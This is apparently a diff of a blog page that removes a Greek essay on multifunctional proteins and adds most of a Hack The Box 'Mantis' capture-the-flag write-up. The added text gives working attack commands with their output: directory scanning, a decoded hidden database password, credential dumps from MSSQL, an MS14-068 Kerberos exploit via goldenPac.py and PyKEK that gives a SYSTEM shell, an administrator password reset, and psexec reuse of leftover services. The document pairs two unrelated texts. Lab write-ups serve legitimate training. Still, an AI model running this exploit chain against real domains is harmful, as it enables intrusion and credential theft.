-<p>Η ύπαρξη δύο λειτουργιών σε μια πρωτεΐνη μπορεί να εξυπηρετεί ως διακόπτης μεταξύ μονοπατιών. Επίσης, μια πολυλειτουργική πρωτεΐνη μπορεί να διασυνδέει ένα λ.χ. μεταβολικό μονοπάτι με ένα σηματοδοτικό μονοπάτι κατά ένα εντελώς απρόσμενο τρόπο. Ένζυμα που ρυθμίζουν τη μεταγραφή ή μετάφραση τους ανάλογα με τη συγκέντρωση του ενζύμου, του υποστρώματος ή του προϊόντος παρέχουν ένα άμεσο μηχανισμό ανάδρασης, ώστε το κύτταρο να ρυθμίζει την παραγωγή του ενζύμου σύμφωνα με τις ανάγκες του. Τέλος, οι διαφορετικές λειτουργίες μια πρωτεΐνης μπορεί να αφορούν την ίδια διεργασία, να αποτελούν λ.χ. διαδοχικά βήματα της.</p>
+Target: http://10.10.10.52:8080
 
-<p>Το στρες που βιώνουν πολλοί άνθρωποι όταν συνδυάζουν δύο δουλειές ή όταν συγκατοικούν μπορεί να ισχύει και για τις πολυλειτουργικές πρωτεΐνες. Για παράδειγμα, το πρότυπο έκφρασης που απαιτείται για τη μια λειτουργία μπορεί να μην είναι ιδανικό/κατάλληλο για την άλλη. Επίσης, μια συγκεκριμένη μεταλλαγή  που μπορεί να ενισχύει την αποτελεσματικότητα της μιας λειτουργίας μπορεί να υπονομεύει την άλλη. Σε αυτές τις περιπτώσεις, ίσως, είναι καλύτερο να διαχωριστούν οι λειτουργίες σε διαφορετικά γονίδια μέσω γονιδιακού διπλασιασμού.</p>
+[10:14:28] Starting: 
+[10:14:50] 200 -    6KB - /
+[10:15:13] 200 -    3KB - /archive
+[10:16:15] 200 -    3KB - /blogs
+[10:17:07] 302 -  163B  - /admin  -&gt;  /Users/Account/AccessDenied?ReturnUrl=%2Fadmin
+[10:21:05] 200 -    2KB - /tags
+[10:27:23] 200 -    3KB - /Archive
+[10:32:18] 200 -    3KB - /pollArchive
+[10:40:06] 200 -    3KB - /Blogs
+[10:45:24] 200 -    3KB - /newsarchive
+[10:54:36] 200 -    3KB - /news_archive
+[11:18:17] 302 -  163B  - /Admin  -&gt;  /Users/Account/AccessDenied?ReturnUrl=%2FAdmin</code></pre></div></div>
 
-<figure>
-<img class="bordered" src="/images/mesh_network.svg" alt="Mesh network" title="Mesh network">
-<figcaption>Η εξελικτική διαδικασία μπορεί να αφορά προσθήκη νέων κόμβων (διπλασιασμός και τροποποίηση γονιδίων) ή τροποποίηση των ήδη υπαρχόντων και ανάπτυξη νέων αλληλεπιδράσεων μεταξύ τους.</figcaption>
-</figure>
+<p>Let&rsquo;s visit <a href="http://10.10.10.52:1337/secure_notes/" target="_blank">http://10.10.10.52:1337/secure_notes/</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">10.10.10.52 - /secure_notes/
+[To Parent Directory]
 
-<h2 id="η-εξέλιξη-χρησιμοποιεί-ό-τι-είναι-διαθέσιμο-ή-ό-τι-υπάρχει-εξελίσσεται">Η εξέλιξη χρησιμοποιεί ό,τι είναι διαθέσιμο (ή ό,τι υπάρχει&hellip; εξελίσσεται)</h2>
+ 9/13/2017  4:22 PM          912 dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
+  9/1/2017  9:13 AM          168 web.config</code></pre></div></p>
 
-<p>Ο Gancedo πρότεινε ως πιο πιθανή εξήγηση για την επικράτηση της πολυλειτουργικότητας, τον τρόπο που συμβαίνει η εξέλιξη, δηλαδή χωρίς τελικό σκοπό και με νέες λειτουργίες να προκύπτουν κυρίως τροποποιώντας/προσαρμόζοντας ήδη υπάρχοντες. Αν μια νέα λειτουργία είναι χρήσιμη για τον οργανισμό θα επιλεγεί κατά την εξέλιξη. Μια πρωτεΐνη μπορεί να έχει μια έμφυτη συμβατότητα για μια νέα λειτουργία κι έτσι αυτή η νέα λειτουργία μπορεί να προκύψει με ελάχιστες μεταλλαγές. Αυτό συμφωνεί και με την παρατήρηση ότι  πρωτεΐνες που είναι παρούσες σχεδόν παντού και τις θεωρούμε αρχαίες (αρά έχουν δεχθεί την επίδραση της εξέλιξης για πολύ μεγάλο χρονικό διάστημα), λ.χ. αρχαία μεταβολικά ένζυμα, εμφανίζουν μεγάλο βαθμό πολυλειτουργικότητας.</p>
+<p>Let&rsquo;s see <a href="http://10.10.10.52:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt" target="_blank">http://10.10.10.52:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">1. Download OrchardCMS
+2. Download SQL server 2014 Express ,create user &#34;admin&#34;,and create orcharddb database
+3. Launch IIS and add new website and point to Orchard CMS folder location.
+4. Launch browser and navigate to http://localhost:8080
+5. Set admin password and configure sQL server connection string.
+6. Add blog pages with admin user.</code></pre></div></p>
 
-<figure>
-<img class="bordered" src="/images/dog_driver.jpg" alt="A dog driving a car" title="A dog driving a car">
-<figcaption class="centered">As it seems, you can teach an old dog new tricks.</figcaption>
-</figure>
+<p>The filename dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt seems to contain some base64-encoded text. Let&rsquo;s explore it:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
+6d2424716c5f53405f504073735730726421</code></pre></div></div></p>
 
-<p>Πράγματι τα περισσότερα ένζυμα που μετέχουν στη γλυκόλυση και στον κύκλο του Krebs έχουν βρεθεί να έχουν και άλλες λειτουργίες. Λ.χ. η αφυδρογονάση της 3-φωσφορικής γλυκεριναλδεύδης έχει 11 διαφορετικές, καλά τεκμηριωμένες, λειτουργίες. Πάρα πολλές πρωτεϊνες που θεωρούνται δομικές (λ.χ. ακτίνη) επιτελούν πολλές άλλες λειτουργίες (έχουν ενζυματική δράση, ρυθμιστικό ρόλο κ.λπ.).</p>
+<p>This seems like a hex string. Let&rsquo;s convert it to ASCII:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ echo 6d2424716c5f53405f504073735730726421 | xxd -r -p
+m$$ql_S@_P@ssW0rd!</code></pre></div></div></p>
 
-<h2 id="πολυλειτουργικότητα-και-εξέλιξη-σύνθετων-χαρακτηριστικών">Πολυλειτουργικότητα και εξέλιξη σύνθετων χαρακτηριστικών</h2>
+<p>Bingo! We found an MSSQL password. Let&rsquo;s test it using the username &ldquo;admin&rdquo;.</p>
 
-<p>Μια από τις προκλήσεις στην εξελικτική θεωρία του Δαρβίνου ήταν να εξηγηθεί πως σύνθετες δομές θα μπορούσαν να έχουν αναπτυχθεί σταδιακά, δεδομένου ότι οι αρχόμενες μορφές τους θα ήταν ανεπαρκείς για να εξυπηρετήσουν τη λειτουργία τους. Όπως είχε πει ο Mivart, ένας επικριτής του Δαρβίνου, 5% της φτερούγας ενός πουλιού δεν θα ήταν λειτουργική, οπότε οι αρχόμενες μορφές σύνθετων χαρακτηριστικών δε θα είχαν επιβιώσει αρκετό διάστημα για να εξελιχθούν σε μια χρήσιμη μορφή.</p>
+<h1 id="exploring-mssql-databases">Exploring MSSQL databases</h1>
 
-<p>Ένα χαρακτηριστικό μπορεί να αναπτυχθεί αρχικά επειδή εξυπηρετούσε ένα συγκεκριμένο σκοπό, αλλά στη συνέχεια να εξελιχθεί να εξυπηρετεί έναν άλλο. Παλιότερα, αυτό το φαινόμενο ονομαζόταν με τον όρο preadaptation («προπροσαρμογή»), αλλά επειδή αυτός ο όρος παραπέμπει σε τελεολογία που είναι αντίθετη με τις αρχές της φυσικής επιλογής, έχει αντικατασταθεί με τους όρους exaptation ή cooption («προσάρτηση») ή co-opted adaptation («προσαρτημένη προσαρμογή»).</p>
+<h2 id="using-impacket-mssqlclient-py">Using Impacket (mssqlclient.py)</h2>
 
-<p>Οι πτερούγες και τα φτερά των πουλιών αποτελούν ένα κλασσικό παράδειγμα. Φαίνεται ότι εξελίχθηκαν αρχικά για τη θερμορύθμιση, αλλά αργότερα προσαρμόσθηκαν για την πτήση. Αυτό όμως δε σημαίνει, πάντα, ότι η πρωταρχική λειτουργία πρέπει να χαθεί ολοκληρωτικά. Τα φτερά για παράδειγμα διατηρούν, τουλάχιστον στη συντριπτική πλειοψηφία των περιπτώσεων, το θερμορρυθμιστικό τους ρόλο. Φαίνεται, λοιπόν, ότι η διαδικασία της εξέλιξης έχει την τάση να δημιουργεί σύνθετα χαρακτηριστικά, ακόμη και αν το εκάστοτε προϊόν έχει αρκετές ατέλειες.
-Διακρίνουμε μια αναλογία μεταξύ της ανάπτυξης σύνθετων χαρακτηριστικών και σύνθετων λειτουργιών σε πρωτεϊνικό επίπεδο, με κοινό παρανομαστή το ρόλο της πολυλειτουργικότητας.</p>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">mssqlclient.py -p 1433 admin:m\$\$ql_S@_P@ssW0rd\!@10.10.10.52
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 
-<figure>
-<a title="I, Keiono [GFDL (http://www.gnu.org/copyleft/fdl.html), CC-BY-SA-3.0 (http://creativecommons.org/licenses/by-sa/3.0/) or CC BY-SA 2.5-2.0-1.0 (http://creativecommons.org/licenses/by-sa/2.5-2.0-1.0)], via Wikimedia Commons" href="https://commons.wikimedia.org/wiki/File%3AHuman_interactome.jpg" target="_blank">
-<img class="bordered centered" src="https://upload.wikimedia.org/wikipedia/commons/0/03/Human_interactome.jpg" alt="Human interactome" title="Human interactome"/>
-</a>
-<figcaption>
-<strong>Human interactome</strong>: Η πολυπλοκότητα του ανθρωπίνου είδους οφείλεται όχι μόνο στον αριθμό των γονιδίων (ο οποίος θεωρείται σχετικά μικρός) αλλά και στις αλληλεπιδράσεις που αναπτύσσονται μεταξύ των προϊόντων τους.
-</figcaption>
-</figure>
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
+[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (120 7208)
+[!] Press help for extra shell commands
 
-<h2 id="πολυλειτουργικότητα-και-εξελικτικός-ρυθμός">Πολυλειτουργικότητα και εξελικτικός ρυθμός</h2>
+SQL&gt; SELECT name FROM master.dbo.sysdatabases
+master
+tempdb
+model
+msdb
+orcharddb
 
-<p>Η συχνότητα με την οποία συσσωρεύονται νουκλεοτιδικές αντικαταστάσεις σε ένα γονίδιο στην πορεία της εξέλιξης εξαρτάται από τις συνέπειες που αυτές έχουν στην προσαρμοστικότητα. Γονίδια στα οποία μεγάλο ποσοστό από τις πιθανές αντικαταστάσεις είναι ωφέλιμο ή ουδέτερο θα εμφανίζουν μεγαλύτερο εξελικτικό ρυθμό και θα συσσωρεύουν αμινοξικές αλλαγές πιο γρήγορα, ενώ γονίδια στα οποία οι περισσότερες αντικαταστάσεις είναι επιβλαβείς θα παραμείνουν πιο συντηρημένα. Αν ένα γονίδιο εμπλέκεται σε πολλές διαφορετικές διεργασίες (πολυλειτουργικό γονίδιο), τότε αντικαταστάσεις που είναι ευνοϊκές για τη μία διεργασία μπορεί συχνά να είναι επιβλαβείς για τις άλλες διεργασίες. Σε όσες περισσότερες διεργασίες εμπλέκεται ένα γονίδιο, τόσο πιο πιθανό είναι ένα ευεργετικό αποτέλεσμα στη μία λειτουργία να συνοδεύεται από επιβλαβείς συνέπειες στις υπόλοιπες. Οι αντικαταστάσεις στα πολυλειτουργικά γονίδια αναμένεται να είναι πιο συχνά επιβλαβείς στο συνολικό τους αποτέλεσμα σε σχέση με αντικαταστάσεις σε γονίδια που εμπλέκονται σε λίγες διεργασίες. Αναμένουμε, λοιπόν, τα πολυλειτουργικά γονίδια να εξελίσσονται με χαμηλότερους ρυθμούς. Η υπόθεση αυτή είναι ανάλογη με την υπόθεση ότι τα πλειοτροπικά γονίδια (γονίδια, δηλαδή, που επηρεάζουν πολλά φαινοτυπικά χαρακτηριστικά) έχουν χαμηλότερους εξελικτικούς ρυθμούς (Otto, 2004).</p>
+SQL&gt; SELECT COLUMN_NAME &#39;All_Columns&#39; FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=&#39;User&#39;
+blog_Orchard_Users_UserPartRecord
+blog_Orchard_Roles_UserRolesPartRecord
 
-<p>Μπορείτε να δείτε ένα χαρακτηριστικό διάγραμμα που δείχνει την αρνητική συσχέτιση μεταξύ της πολυλειτουργικότητας και του ρυθμού εξέλιξης των γονιδίων στον Saccharomyces cerevisiae <a href="http://mbe.oxfordjournals.org/content/23/4/721/F1.expansion.html" target="_blank">εδώ</a>.</p>
+SQL&gt; use orcharddb
+SQL&gt; SELECT COLUMN_NAME &#39;All_Columns&#39; FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=&#39;blog_Orchard_Users_UserPartRecord &#39;
+Id
+UserName
+Email
+NormalizedUserName
+Password
+PasswordFormat
+HashAlgorithm
+PasswordSalt
+RegistrationStatus
+EmailStatus
+EmailChallengeToken
+CreatedUtc
+LastLoginUtc
+LastLogoutUtc
 
-<p lang="en" class="author">Antonios Tsolis</p>
-<p lang="el" class="author">Αντώνιος Τσώλης</p>
+SQL&gt; select UserName,Password from blog_Orchard_Users_UserPartRecord
+admin
+AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==
+James
+J@m3s_P@ssW0rd!</code></pre></div></div>
 
-<h1 id="ενδεικτική-βιβλιογραφία">Ενδεικτική βιβλιογραφία</h1>
+<h2 id="using-metasploit">Using Metasploit</h2>
 
-<ul>
-<li>Daphne H.E.W. Huberts, Ida J. van der Klei, «Moonlighting proteins: An intriguing mode of multitasking», Biochimica et Biophysica Acta (BBA) - Molecular Cell Research, Volume 1803, Issue 4, April 2010, Pages 520-525, ISSN 0167-4889.</li>
-<li>Yanwu Zeng and Xun Gu, «Genome factor and gene pleiotropy hypotheses in protein evolution», Biology Direct 2010, 5:37.</li>
-<li>Constance J Jeffery, «Moonlighting proteins: old proteins learning new tricks», Trends in Genetics, Volume 19, Issue 8, August 2003, Pages 415-417, ISSN 0168-9525.</li>
-<li>Christine Vogel, Matthew Bashton, Nicola D Kerrison, Cyrus Chothia, Sarah A Teichmann, «Structure, function and evolution of multidomain proteins», Current Opinion in Structural Biology, Volume 14, Issue 2, April 2004, Pages 208-216, ISSN 0959-440X.</li>
-<li>Roy, S. (1999), «Multifunctional enzymes and evolution of biosynthetic pathways: Retro-evolution by jumps». Proteins: Structure, Function, and Bioinformatics, 37: 303–309.</li>
-<li>Joram Piatigorsky, «Gene Sharing, Lens Crystallins and Speculations on an Eye/Ear Evolutionary Relationship», Integr. Comp. Biol. (2003) 43(4): 492-499.</li>
-<li>Jeffery C.J., «Multifunctional proteins: examples of gene sharing»,  Annals of Medicine, 2003, Volume 35, Issue 1, SP-28, EP-35, M3.</li>
-<li>Xionglei He and Jianzhi Zhang, «Toward a Molecular Understanding of Pleiotropy», Genetics August 2006 173:1885-1891; published ahead of print May 15, 2006.
-Apic, G., Gough, J., and Teichmann, S. A (2001). «Domain combinations in archaeal, eubacterial and eukaryotic proteomes». J Mol Biol 310 (2): 311–325. doi:10.1006/jmbi.2001.4776. PMID 11428892.</li>
-<li>Davidson JN, Chen KC, Jamison RS, Musmanno LA, Kern CB. (1993). &ldquo;The evolutionary history of the first three enzymes in pyrimidine biosynthesis&rdquo;. Bioessays 15 (3): 157–64. doi:10.1002/bies.950150303. PMID 8098212.</li>
-<li>Marcel Salathé, Martin Ackermann and Sebastian Bonhoeffer, «The Effect of Multifunctionality on the Rate of Evolution in Yeast», Mol Biol Evol (April 2006) 23(4): 721-722.</li>
-<li>Genomes. Brown TA. Chapter 15 «How Genomes Evolve».</li>
-</ul>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msfconsole
+msf &gt; use auxiliary/admin/mssql/mssql_findandsampledata
+msf auxiliary(mssql_findandsampledata) &gt; set USERNAME admin
+msf auxiliary(mssql_findandsampledata) &gt; set PASSWORD m$$ql_S@_P@ssW0rd!
+msf auxiliary(mssql_findandsampledata) &gt; set SAMPLE_SIZE 10
+
+Name                Current Setting    Required Description
+----                ---------------    -------- -----------
+KEYWORDS            passw|credit|card  yes      Keywords to search for
+PASSWORD            m$$ql_S@_P@ssW0rd! no       The password for the specified username
+RHOSTS              10.10.10.52        yes      The target address range or CIDR identifier
+RPORT               1433               yes      The target port (TCP)
+SAMPLE_SIZE         10                 yes      Number of rows to sample
+TDSENCRYPTION       false              yes      Use TLS/SSL for TDS data &#34;Force Encryption&#34;
+THREADS             1                  yes      The number of concurrent threads
+USERNAME            admin              no       The username to authenticate as
+USE_WINDOWS_AUTHENT false              yes      Use windows authentification (requires DOMAIN option set)
+
+msf auxiliary(mssql_findandsampledata) &gt; exploit
+
+[*] 10.10.10.52:1433 - Attempting to connect to the SQL Server at 10.10.10.52:1433...
+[*] 10.10.10.52:1433 - Successfully connected to 10.10.10.52:1433
+[*] 10.10.10.52:1433 - Attempting to retrieve data ...
+[*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., Password, nvarchar, AL1337E2D6YHm0iIysVzG8LA76Oozg
+[*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., Password, nvarchar, J@m3s_P@ssW0rd!
+[*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., PasswordSalt, nvarchar, NA
+[*] 10.10.10.52:1433 - MANTIS\\SQLEXPRESS, orcharddb, ..., PasswordSalt, nvarchar, UBwWF1CQCsaGc/P7jIR/kg==
+[*] 10.10.10.52:1433 - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</code></pre></div></div>
+
+<h1 id="exploiting-kerberos">Exploiting Kerberos</h1>
+
+<p>We have found some credentials (james:J@m3s_P@ssW0rd!) in the MSSQL orcharddb.
+Let&rsquo;s use them to exploit Kerberos:</p>
+
+<h2 id="using-impacket-goldenpac-py">Using Impacket (goldenPac.py)</h2>
+
+<p>Add these lines to /etc/hosts:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">10.10.10.52 mantis.htb.local
+10.10.10.52 htb.local</code></pre></div></div></p>
+
+<p>Now let&rsquo;s run goldenPac.py:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
+
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
+[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
+[*] Attacking domain controller mantis.htb.local
+[*] mantis.htb.local found vulnerable!
+[*] Requesting shares on mantis.htb.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file hgjtJStu.exe
+[*] Opening SVCManager on mantis.htb.local.....
+[*] Creating service rQic on mantis.htb.local.....
+[*] Starting service rQic.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system</code></pre></div></div></p>
+
+<h2 id="using-pykek-i-e-python-kerberos-exploitation-kit-ms14-068-py">Using PyKEK i.e. Python Kerberos Exploitation Kit (ms14-068.py)</h2>
+
+<p>Add these lines to /etc/hosts:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">10.10.10.52 mantis.htb.local
+10.10.10.52 htb.local</code></pre></div></div></p>
+
+<p>Add this line to /etc/resolv.conf:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">nameserver 10.10.10.52</code></pre></div></div></p>
+
+<p>Get USER_SID using rpcclient:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ rpcclient -U james 10.10.10.52
+Enter james&#39;s password: J@m3s_P@ssW0rd!
+rpcclient $&gt; lookupnames james
+james S-1-5-21-4220043660-4019079961-2895681657-1103</code></pre></div></div></p>
+
+<p>Create the ticket and copy it into the proper location:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ git clone https://github.com/bidord/pykek &amp;&amp; cd pykek
+$ python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
+Password:J@m3s_P@ssW0rd!
+
+$ cp TGT_james@htb.local.ccache /tmp/krb5cc_$(echo $UID)</code></pre></div></div></p>
+
+<p>Connect using smbclient:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ smbclient -k -U james \\\\mantis.htb.local\\C$
+
+OS=[Windows Server 2008 R2 Standard 7601 Service Pack 1] Server=[Windows Server 2008 R2 Standard 6.1]
+smb: \&gt; more \USERS\Administrator\DESKTOP\root.txt
+209dc756ee5c09a9967540fe18d15567</code></pre></div></div></p>
+
+<h2 id="a-word-of-advice">A word of advice</h2>
+
+<p>If Kerberos does not work as expected, make sure that you have added the proper lines in /etc/hosts and /etc/resolv.conf (and -of course- check the kerberos configuration files if you use them). Notice that kinit seems to need UPPERCASE letters for the domain in order to work correctly. Compare the following different results:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ kinit -V james@htb.local
+Using default cache: /tmp/krb5cc_1000
+Using principal: james@htb.local
+Password for james@htb.local: J@m3s_P@ssW0rd!
+kinit: KDC reply did not match expectations while getting initial credentials
+
+$ kinit -V james@HTB.LOCAL
+Using default cache: /tmp/krb5cc_1000
+Using principal: james@HTB.LOCAL
+Password for james@HTB.LOCAL: J@m3s_P@ssW0rd!
+Authenticated to Kerberos v5
+BONUS: Exploitation using left behind services</code></pre></div></div></p>
+
+<h1 id="look-mom-no-need-for-kerberos-exploit-d">Look Mom! No need for kerberos exploit! :D</h1>
+
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ psexec.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] Trying protocol 445/SMB...
+[*] Requesting shares on mantis.htb.local.....
+[-] share &#39;ADMIN$&#39; is not writable.
+[-] share &#39;C$&#39; is not writable.
+[-] share &#39;NETLOGON&#39; is not writable.
+[-] share &#39;SYSVOL&#39; is not writable.
+[*] Uploading file VdYFkBHZ.exe
+[-] Error uploading file VdYFkBHZ.exe, aborting.....
+[-] Error performing the installation, cleaning up: &#39;NoneType&#39; object has no attribute &#39;split&#39;
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\system</code></pre></div></div>
+
+<p>We got some errors, but it worked! Maybe we have access to a writable share after all&hellip;
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ smbmap.py -u james -p J@m3s_P@ssW0rd\! -H mantis.htb.local
+[+] Finding open SMB ports....
+[+] User SMB session establishd on mantis.htb.local...
+[+] IP: mantis.htb.local:445    Name: mantis.htb.local                                  
+    Disk                                                Permissions
+    ----                                                -----------
+    ADMIN$                                              NO ACCESS
+    C$                                                  NO ACCESS
+    IPC$                                                NO ACCESS
+    NETLOGON                                            READ ONLY
+    SYSVOL                                              READ ONLY</code></pre></div></div></p>
+
+<p>No. We don&rsquo;t have access to a writable share. This is very strange. How did we get nt authority\system shell? I decided to open an issue on the github: <a href="https://github.com/CoreSecurity/impacket/issues/346" target="_blank">https://github.com/CoreSecurity/impacket/issues/346</a></p>
+
+<p>It seems that psexec.py is connecting to a previous RemComSvc instance that is still running in the target system. The need for a writeable share is only for copying the RemComSvc Windows Service file. Once it is running, all communication is done through Windows Named Pipes.</p>
+
+<p>I changed the password for the administrator account to make it easier to explore the issue:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">C:\Windows\system32&gt; net user Administrator P@ssw0rd</code></pre></div></div></p>
+
+<p>We can use Impacket (services.py) to list the services. We look for services named using four random uppercase letters. Moreover, their executable file should be named using eight random mixed case letters and its path should be inside C:\Windows\ :
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">services.py htb.local/administrator:P@ssw0rd@mantis.htb.local list
+
+...
+IHXM -                   IHXM -  RUNNING
+...
+TZZW -                   TZZW -  RUNNING
+...
+
+$ services.py htb.local/administrator:P@ssw0rd@mantis.htb.local config -name IHXM
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] Trying protocol 445/SMB...
+[*] Querying service config for IHXM
+TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
+START_TYPE        :  2 -  AUTO START
+ERROR_CONTROL     :  0 -  IGNORE
+BINARY_PATH_NAME  : C:\Windows\dZEyLGVN.exe
+LOAD_ORDER_GROUP  : 
+TAG               : 0
+DISPLAY_NAME      : IHXM
+DEPENDENCIES      : /
+
+$ services.py htb.local/administrator:P@ssw0rd@mantis.htb.local config -name TZZW
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] Trying protocol 445/SMB...
+[*] Querying service config for TZZW
+TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
+START_TYPE        :  2 -  AUTO START
+ERROR_CONTROL     :  0 -  IGNORE
+BINARY_PATH_NAME  : C:\Windows\EfuIvklz.exe
+LOAD_ORDER_GROUP  : 
+TAG               : 0
+DISPLAY_NAME      : TZZW
+DEPENDENCIES      : /
+SERVICE_START_NAME: LocalSystem</code></pre></div></div></p>
+
+<p>Now, let&rsquo;s try to stop those two services and check if psexec still works as before:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ services.py htb.local/administrator:P@ssw0rd@mantis.htb.local stop -name IHXM
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] Trying protocol 445/SMB...
+[*] Stopping service IHXM
+
+$ services.py htb.local/administrator:P@ssw0rd@mantis.htb.local stop -name TZZW
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] Trying protocol 445/SMB...
+[*] Stopping service TZZW
+
+$ psexec.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] Trying protocol 445/SMB...
+
+[*] Requesting shares on mantis.htb.local.....
+[-] share &#39;ADMIN$&#39; is not writable.
+[-] share &#39;C$&#39; is not writable.
+[-] share &#39;NETLOGON&#39; is not writable.
+[-] share &#39;SYSVOL&#39; is not writable.
+[*] Uploading file ysSjUyKc.exe
+[-] Error uploading file ysSjUyKc.exe, aborting.....
+[-] Error performing the installation, cleaning up: &#39;NoneType&#39; object has no attribute &#39;split&#39;</code></pre></div></div></p>
+
+<p>Yup, it doesn&rsquo;t work anymore. This confirms that those two services were responsible for the previous behaviour. But how those services were installed on the box in the first place? I don&rsquo;t know. Probably, during the testing phase, some pentester tried to use psexec.py. If -for any reason- the cleaning up phase of the tool failed, it left behind those services.</p>
 
         </div>
 
         <aside>
           <div class="p-share centered">
-            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fmultifunctional_proteins%2f&t=Multifunctional%20proteins%20and%20evolution%20%28available%20in%20greek%20only%29" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
-            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2fmultifunctional_proteins%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
-            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fmultifunctional_proteins%2f&text=Multifunctional%20proteins%20and%20evolution%20%28available%20in%20greek%20only%29&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fmultifunctional_proteins%2f&text=%ce%a0%ce%bf%ce%bb%cf%85%ce%bb%ce%b5%ce%b9%cf%84%ce%bf%cf%85%cf%81%ce%b3%ce%b9%ce%ba%ce%ad%cf%82%20%cf%80%cf%81%cf%89%cf%84%ce%b5%ce%90%ce%bd%ce%b5%cf%82%20%ce%ba%ce%b1%ce%b9%20%ce%b5%ce%be%ce%ad%ce%bb%ce%b9%ce%be%ce%b7&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
